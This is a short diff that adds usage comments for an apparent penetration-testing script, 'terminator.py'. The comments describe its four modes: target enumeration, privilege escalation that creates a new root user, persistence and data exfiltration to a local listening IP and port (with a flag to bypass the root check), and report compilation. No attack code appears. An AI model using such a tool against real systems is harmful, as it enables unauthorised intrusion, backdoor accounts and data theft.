@@ -1,0 +1,11 @@
+# <> note: terminator.py consists of four modules. for full terminator productivity, you will need to run the script *four* separate times throughout the pentest:
+# first on your own machine for target enumeration, second time on the target machine after manually gaining a shell, 
+# third time on the target machine after terminator gains root privileges, and fourth time on your local machine to compile the report.
+#
+# enumeration: python3 terminator.py enum -t <target_ip_to_enumerate> (optional: -w <path_to_directory_wordlist> (otherwise, terminator will use default list))
+#
+# privilege escalation: python3 terminator.py priv -u <new_root_username> -p <new_root_passwd> 
+#
+# persistence/data exfiltration: python3 terminator.py root -u <new_user_name> -p <new_user_passwd> -l <local_ip> -x <local_listening_port> (optional: -f (bypass root permissions check))
+#
+# report: python3.9 terminator.py report -o <output_file_name>
